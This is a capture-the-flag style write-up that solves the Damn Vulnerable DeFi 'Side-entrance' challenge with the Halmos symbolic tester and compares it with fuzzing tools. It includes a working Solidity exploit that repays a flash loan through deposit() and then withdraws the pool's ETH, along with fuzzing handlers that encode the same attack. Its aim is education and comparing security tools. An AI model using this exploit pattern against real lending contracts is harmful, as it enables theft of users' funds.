# Halmos vs Side-entrance
## Halmos version
halmos 0.2.2.dev1+gd4cac2e was used in this article
## Foreword
It is strongly assumed that the reader is familiar with the previous articles on solving 
1. ["Unstoppable"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
2. ["Truster"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster)
3. ["Naive-receiver"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)

since the main ideas here are largely repeated and we will not dwell on them again.
## Preparation
### Common prerequisites
1. Copy **SideEntrance.t.sol** file to **SideEntranceHalmos.t.sol**. We will work in this file.
2. Rename **“test_sideEntrance()”** to **"check_sideEntrance()"**, so Halmos will execute this test symbolically.
3. Avoid using **makeAddr()** cheatcode:
    ```solidity
    address deployer = address(0xcafe0000);
    address player = address(0xcafe0001);
    address recovery = address(0xcafe0002);
    ```
4. Create **GlobalStorage** contract and save pool's address-name pair:
    ```solidity
    import "lib/GlobalStorage.sol";
    ...
    contract SideEntranceChallenge is Test {
        ...
        GlobalStorage glob;
        ...
        function setUp() public {
            startHoax(deployer);
            glob = new GlobalStorage();
            ...
            glob.add_addr_name_pair(address(pool), "SideEntranceLenderPool");
            vm.stopPrank();
        }
    ...
    }
    ```
5. Bypass issue #338
    ```solidity
    startHoax(deployer, 1 << 80);
    ```
6. Print all contract addresses, including the upcoming **SymbolicAttacker**:
    ```solidity
    function check_sideEntrance() public checkSolvedByPlayer {
        SymbolicAttacker attacker = new SymbolicAttacker();
        console.log("GlobalStorage\t\t", address(glob));
        console.log("SideEntranceLenderPool\t", address(pool));
        console.log("SymbolicAttacker\t\t", address(attacker));
        ...
    }
    ```
    ```javascript
    $ halmos --solver-timeout-assertion 0 --function check_sideEntrance
    ...
    [console.log] GlobalStorage              0x00000000000000000000000000000000000000000000000000000000aaaa0002
    [console.log] SideEntranceLenderPool     0x00000000000000000000000000000000000000000000000000000000aaaa0003
    [console.log] SymbolicAttacker           0x00000000000000000000000000000000000000000000000000000000aaaa0004
    ```
### _isSolved() implementation
The original checks look like:
```solidity
function _isSolved() private view {
    assertEq(address(pool).balance, 0, "Pool still has ETH");
    assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
}
```
This time we won't be doing a completely opposite check. Instead, taking into account the lessons we learned in the previous **"Naive-receiver"**, we will first look for just some bug. Let's remove the condition about recovery and find out if we can even empty the pool by some amount:
```solidity
function _isSolved() private view {
    assert(address(pool).balance >= ETHER_IN_POOL);
}
```
### SymbolicAttacker implementation
In this challenge, we encounter the logic of using native **ETH** assets instead of some token or wrapped **ETH** (**WETH**) for the first time. Therefore, it is natural that **SymbolicAttacker** should also consider **ETH** value in transactions. First, when we deploy a contract, Halmos correctly assumes that its balance may already be non-zero, preventing a possible [force feeding](https://consensys.github.io/smart-contract-best-practices/development-recommendations/general/force-feeding/) scenario. Therefore, as soon as we have deployed the contract, its **ETH** balance is already a symbolic value. However, this is inconvenient in our case, so we will explicitly state that **SymbolicAttacker**'s balance is **player**'s balance. We still can execute transactions from **player** since Halmos doesn't count gas :):
```solidity
function check_sideEntrance() public checkSolvedByPlayer {
    SymbolicAttacker attacker = new SymbolicAttacker();
    vm.deal(address(attacker), PLAYER_INITIAL_ETH_BALANCE);
    vm.deal(address(player), 0); // Player's ETH is transferred to attacker.
    ...
```
And another important addition: now we pass in symbolic transactions not only the symbolic parameters of the function itself, but also the symbolic value of **ETH**:
```solidity
contract SymbolicAttacker is Test, SymTest {
    ...
    function execute_tx() private {
        uint256 ETH_val = svm.createUint256("ETH_val");
        address target = svm.createAddress("target");
        bytes memory data;
        //Get some concrete target-name pair
        (target, data) = glob.get_concrete_from_symbolic(target);
        target.call{value: ETH_val}(data);
    }
    ...
}
```
## Improvement of coverage
According to the familiar principle, we start with single symbolic transaction. Let's see if all the code is covered:
```solidity
function check_sideEntrance() public checkSolvedByPlayer {
    ...
    attacker.attack();
}
```
```solidity
contract SymbolicAttacker is Test, SymTest {
    ...
    function attack() public {
        execute_tx();
    }
```
### Callbacks
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_sideEntrance -vvvvv
...
Path #4:
            ...
            CALL SideEntranceLenderPool::flashLoan(p_amount_uint256_a507985_05()) (value: halmos_ETH_val_uint256_4f72fbf_01)
                CALL SymbolicAttacker::execute() (value: p_amount_uint256_a507985_05)
                ↩ REVERT 0x (error: Revert())
                ...
...
[PASS] check_sideEntrance() (paths: 9, time: 0.26s, bounds: [])
```
There is a problem here: **SideEntranceLenderPool::flashLoan()** assumes that the contract that called this function has a payable callback "**execute()**", which our **SymbolicAttacker** does not have. 
```solidity
contract SideEntranceLenderPool {
    ...
    function flashLoan(uint256 amount) external {
        ...
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    ...
    }
```
Obviously, we need to implement some **execute()** function inside of **SymbolicAttacker**. But what should be there? Literally anything can be executed during this function... Actually, this is the answer - we work with it as with **attack()** - a number of symbolic subtransactions are simply executed inside. Let's start with one, and then we'll see if it's enough.
```solidity
function execute () external payable {
    uint256 ETH_val = svm.createUint256("ETH_val_execute");
    address target = svm.createAddress("target_execute");
    bytes memory data;
    //Get some concrete target-name pair
    (target, data) = glob.get_concrete_from_symbolic(target);
    target.call{value: ETH_val}(data);
}
```
And one more problem in **SideEntranceLenderPool::withdraw()**.
Despite the fact that **SymbolicAttacker** had no pool balance at the time of the transaction, Halmos still attempted to transfer some symbolic amount of **ETH** to **SymbolicAttacker**. And this is what happened:
```javascript
Path #2:
...
           CALL SideEntranceLenderPool::withdraw() (value: halmos_ETH_val_uint256_4f72fbf_01)
           ...
                CALL SymbolicAttacker::0x
                ↩ REVERT 0x (error: Revert())
                ...
```
We don't have the **receive()** callback function, so we implement it as well:
```solidity
receive() external payable {
    uint256 ETH_val = svm.createUint256("ETH_val_receive");
    address target = svm.createAddress("target_receive");
    bytes memory data;
    //Get some concrete target-name pair
    (target, data) = glob.get_concrete_from_symbolic(target);
    target.call{value: ETH_val}(data);
}
```
### Preventing recursion
Now let's talk about possible recursion. This time, since we have 2 callback functions in **SymbolicAttacker** that behave like **execute_tx()**, we won't be able to conveniently use the **vm.assume(...)** pattern. At the same time, the standard [ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) will not work for us, as it is common to all functions, which can cut off some scenarios.
So, let's make our simplest analogue of **ReentrancyGuard**:
```solidity
contract SymbolicAttacker is Test, SymTest {
...
    bool receive_reent_guard = false;
    bool execute_reent_guard = false;
    ...
    receive() external payable {
        if (receive_reent_guard) {
            revert();
        }
        receive_reent_guard = true;
        ...
        receive_reent_guard = false;
    }
    
    function execute () external payable {
        if (execute_reent_guard) {
            revert();
        }
        execute_reent_guard = true;
        ...
        execute_reent_guard = false;
    }
```
Run again:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_sideEntrance
...
[PASS] check_sideEntrance() (paths: 57, time: 1.70s, bounds: [])
...
```
Perfectly. The number of completed paths has increased. Well, you can already guess what will happen next :)
## Increasing transactions
Add another symbolic attacking transaction:
```solidity
function attack() public {
    execute_tx();
    execute_tx();
}
```
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_sideEntrance
...

[FAIL] check_sideEntrance() (paths: 3334, time: 102.26s, bounds: [])
```
Okay, that was pretty easy. Let's analyze a counterexample.
## Counterexamples analysis
The counterexample clearly shows the sequence of what happened. 
**SideEntranceLenderPool::flashLoan()** was called. pool called the **execute()** function from our **SymbolicAttacker**. He, in turn, using borrowed funds (and little amount of his own), put them on deposit in the same pool. **flashLoan** ended successfully, as the balance of the pool at the time of the end of flashLoan became even larger. After that, the **SymbolicAttacker** simply withdrew all the 
unfair funds from the  deposit with the **withdraw()** function in the second transaction. 

Let's also pay attention to what was done in the **receive()** callback:

```javascript
halmos_selector_bytes4_780a835_24 = 0x00000000
halmos_ETH_val_receive_uint256_4d032b7_19 = 0x000000000000000000000000000000000000000000000016c7c8b6b3a7640000
```
Selector **0x00000000** is an **ETH** transfer. That is, it is simply sending a certain amount of **Ether** back to the pool. Since this does not affect the attack in any way, this part of the counterexample can be ignored when building the attack.
## Using a counterexample
Now, with the bug, the attack becomes obvious:
```solidity
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract Attacker {
    uint256 constant ETHER_IN_POOL = 1000e18;
    SideEntranceLenderPool public pool;
    uint256 public amount;
    address public recovery;

    constructor (   SideEntranceLenderPool _pool, 
                    uint256 _amount, 
                    address _recovery) {
        pool = _pool;
        amount = _amount;
        recovery = _recovery;
    }

    receive() external payable {
    }

    function execute () external payable {
        pool.deposit(amount);
    }

    function attack(address recovery) public {
        pool.flashLoan(amount);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(recovery, ETHER_IN_POOL);
    }
}
```
```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    Attacker attacker = new Attacker(pool, 1000e18, recovery);
    attacker.attack();
}
```
Run:
```javascript
$ forge test --mp test/side-entrance/SideEntrance.t.sol
...
[PASS] test_sideEntrance() (gas: 295447)
```
Another Damn Vulnerable Defi challenge solved!
## Fuzzing vs Side-entrance
I found some solutions to this problem by fuzzing on the internet. First one is [this article](https://www.rareskills.io/post/invariant-testing-solidity) by **Team RareSkills**. But there is an issue with this solution: they used a **Handler** that was written in such a way that the **Foundry** fuzzer "knows" in advance what the bug is and how to exploit it. That is, they gave the fuzzer too big hint:
```solidity
import {SideEntranceLenderPool} from "../../src/SideEntranceLenderPool.sol";

import "forge-std/Test.sol";

contract Handler is Test {
    // the pool contract
    SideEntranceLenderPool pool;
    
    // used to check if the handler can withdraw ether after the exploit
    bool canWithdraw;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;

        vm.deal(address(this), 10 ether);
    }
    
    // this function will be called by the pool during the flashloan
    function execute() external payable {
        pool.deposit{value: msg.value}(); // !!! This line is too explicit hint
        canWithdraw = true;
    }
    
    // used for withdrawing ether balance in the pool
    function withdraw() external {
        if (canWithdraw) pool.withdraw();
    }

    // call the flashloan function of the pool, with a fuzzed amount
    function flashLoan(uint amount) external {
        pool.flashLoan(amount);
    }

    receive() external payable {}
}
```
In my opinion, using such a **Handler** is not enough to say that the fuzzing is really capable of finding this kind of bugs.

Another solution is made by the **Crytic team** and can be found [at this link](https://github.com/crytic/building-secure-contracts/blob/master/program-analysis/echidna/exercises/exercise7/solution.sol). Here the situation is much better: the solution is abstract enough and gives space for **Echidna** itself to find a bug. Besides, it only took a few seconds to solve it.

Let's compare how **Echidna** and **Halmos** deal with the problem of "taking into account that any function can be executed inside **execute()**".

Echidna:
```solidity
...
function setEnableWithdraw(bool _enabled) public {
    enableWithdraw = _enabled;
}

function setEnableDeposit(bool _enabled, uint256 _amount) public {
    enableDeposit = _enabled;
    depositAmount = _amount;
}

function execute() external payable override {
    if (enableWithdraw) {
        pool.withdraw();
    }
    if (enableDeposit) {
        pool.deposit{value: depositAmount}();
    }
}
...
```
We explicitly indicate which functions can be called and with which parameters. Obviously, if there was a larger setup - this code would become much more "bloated". We already saw something like this in ["Truster"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster#echidna).

Now Halmos:
```solidity
function execute () external payable {
    ...
    uint256 ETH_val = svm.createUint256("ETH_val_execute");
    address target = svm.createAddress("target_execute");
    bytes memory data;
    (target, data) = glob.get_concrete_from_symbolic(target);
    target.call{value: ETH_val}(data);
    ...
}
```
It is easy to see that the Halmos-based code provides a better abstraction for such cases and does a better job of expanding the setup.
## Conclusions
1. Using already accumulated techniques and principles, we solved the next Damn Vulnerable Defi challenge with Halmos quite easily. Every step was obvious and self-explanatory.
2. Adapting the test to a specific contract is a good idea. For example, in this challenge we adapted to use native **ETH**.
3. We confirm again the conclusions we made earlier: in the case of a small setup, fuzzing really seems to be a very effective tool, even if it is necessary to use some transaction abstraction. However, fuzzing engines do not have convenient abstraction mechanisms, so if target contracts are tied to some logic of abstract calls, Halmos looks much more convenient and powerful.
